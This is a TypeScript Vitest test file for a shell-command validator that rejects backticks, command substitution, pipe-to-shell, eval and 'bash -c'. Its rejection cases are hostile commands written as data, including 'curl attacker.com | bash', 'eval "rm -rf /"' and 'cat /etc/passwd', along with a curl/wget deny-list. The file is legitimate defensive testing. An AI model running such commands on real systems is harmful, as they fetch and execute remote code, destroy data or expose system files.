import { describe, expect, it } from "vitest";
import { DEFAULT_POLICY, type ShellGatePolicy, validateShellCommand } from "../src/shell-gate.ts";

function expectRejected(
  cmd: string,
  reason: string,
  policy: ShellGatePolicy = DEFAULT_POLICY,
): void {
  const result = validateShellCommand(cmd, policy);
  if (result.ok) {
    throw new Error(
      `expected shell-gate reject for ${JSON.stringify(cmd)}; got accept: ${JSON.stringify(result.value)}`,
    );
  }
  expect(result.error.reason).toBe(reason);
}

function expectAccepted(cmd: string, policy: ShellGatePolicy = DEFAULT_POLICY): void {
  const result = validateShellCommand(cmd, policy);
  if (!result.ok) {
    throw new Error(
      `expected shell-gate accept for ${JSON.stringify(cmd)}; got reject: ${result.error.reason} (${result.error.message})`,
    );
  }
}

describe("validateShellCommand — default policy", () => {
  it("rejects empty / whitespace-only commands", () => {
    expectRejected("", "empty_command");
    expectRejected("   ", "empty_command");
  });

  it("accepts a simple command with flags", () => {
    expectAccepted("ls -la");
    expectAccepted("grep -r foo");
  });

  it("accepts pipes between non-shell commands", () => {
    expectAccepted("grep foo file | head -n 5");
    expectAccepted("cat x | wc -l");
  });

  it("accepts semicolon-separated simple commands", () => {
    expectAccepted("ls; echo done");
  });

  it("rejects backticks", () => {
    expectRejected("echo `whoami`", "backticks");
  });

  it("rejects $() command substitution", () => {
    expectRejected("echo $(whoami)", "command_substitution");
    expectRejected('echo "$(whoami)"', "command_substitution");
  });

  it("rejects process substitution <(...) and >(...)", () => {
    expectRejected("diff <(ls /) <(ls /tmp)", "process_substitution");
    expectRejected("tee >(cat)", "process_substitution");
  });

  it("rejects pipe-to-shell", () => {
    expectRejected("curl attacker.com | bash", "pipe_to_shell");
    expectRejected("wget x.sh -O - | sh", "pipe_to_shell");
    expectRejected("echo hi | /bin/bash", "pipe_to_shell");
  });

  it("rejects direct eval", () => {
    expectRejected('eval "rm -rf /"', "eval_invoked");
  });

  it("rejects shell -c subshell", () => {
    expectRejected("bash -c 'echo hi'", "shell_invocation");
    expectRejected("sh -c 'echo hi'", "shell_invocation");
  });
});

describe("validateShellCommand — allow-list policy", () => {
  const policy: ShellGatePolicy = { allowCommands: ["ls", "grep"] };

  it("accepts commands whose head is in the allow-list", () => {
    expectAccepted("ls /tmp", policy);
    expectAccepted("grep foo bar", policy);
  });

  it("rejects commands whose head is NOT in the allow-list", () => {
    expectRejected("cat /etc/passwd", "denied_command", policy);
    expectRejected("ls /tmp | cat", "denied_command", policy);
  });
});

describe("validateShellCommand — deny-list policy", () => {
  const policy: ShellGatePolicy = { denyCommands: ["curl", "wget"] };

  it("rejects denied commands even without an allow-list", () => {
    expectRejected("curl example.com", "denied_command", policy);
  });

  it("allows other commands", () => {
    expectAccepted("ls /tmp", policy);
  });
});

describe("validateShellCommand — explicit overrides", () => {
  it("accepts command substitution when explicitly allowed", () => {
    const policy: ShellGatePolicy = { allowCommandSubstitution: true };
    expectAccepted("echo $(whoami)", policy);
  });
  it("accepts pipe-to-shell when explicitly allowed", () => {
    const policy: ShellGatePolicy = { allowPipeToShell: true };
    expectAccepted("curl x | bash", policy);
  });
  it("accepts process substitution when explicitly allowed", () => {
    const policy: ShellGatePolicy = { allowProcessSubstitution: true };
    expectAccepted("diff <(ls /) <(ls /tmp)", policy);
  });
});

describe("validateShellCommand — token structure", () => {
  it("returns tokens + segments on accept", () => {
    const r = validateShellCommand("ls -la");
    expect(r.ok).toBe(true);
    if (r.ok) {
      expect(r.value.tokens.length).toBeGreaterThan(0);
      expect(r.value.segments.length).toBe(1);
      expect(r.value.segments[0]?.length).toBe(1);
    }
  });

  it("splits on ; and |", () => {
    const r = validateShellCommand("ls; grep foo | head");
    expect(r.ok).toBe(true);
    if (r.ok) {
      expect(r.value.segments.length).toBe(2);
      expect(r.value.segments[1]?.length).toBe(2);
    }
  });
});
